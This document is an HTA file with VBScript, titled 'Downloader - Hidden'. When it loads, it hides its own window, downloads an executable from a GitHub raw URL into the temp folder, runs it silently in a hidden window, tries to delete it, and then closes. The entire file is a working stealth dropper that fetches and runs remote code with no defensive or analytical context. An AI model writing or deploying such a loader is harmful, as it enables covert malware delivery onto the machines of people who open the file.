<html>
<head>
  <title>Downloader - Hidden</title>
  <HTA:APPLICATION
    ID="app"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
  >
  <script language="VBScript">
    Sub Window_OnLoad()
      ' Hide the window immediately
      window.resizeTo 0, 0
      window.moveTo -10000, -10000

      Dim fileUrl, savePath
      fileUrl = "https://raw.githubusercontent.com/wasderlol/test/main/test.exe"

      Dim fso
      Set fso = CreateObject("Scripting.FileSystemObject")
      savePath = fso.GetSpecialFolder(2) & "\downloadedfile.exe"

      Dim xmlHttp, adoStream, shell
      Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
      xmlHttp.Open "GET", fileUrl, False
      xmlHttp.Send

      If xmlHttp.Status = 200 Then
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1 ' Binary
        adoStream.Open
        adoStream.Write xmlHttp.ResponseBody
        adoStream.SaveToFile savePath, 2
        adoStream.Close

        Set shell = CreateObject("WScript.Shell")
        shell.Run Chr(34) & savePath & Chr(34), 0, False ' 0 = hidden window, async

        ' Wait approx 3 seconds before deleting the file (no WScript.Sleep in HTA, so skip)

        On Error Resume Next
        fso.DeleteFile savePath, True
      End If

      window.close()
    End Sub
  </script>
</head>
<body>
</body>
</html>
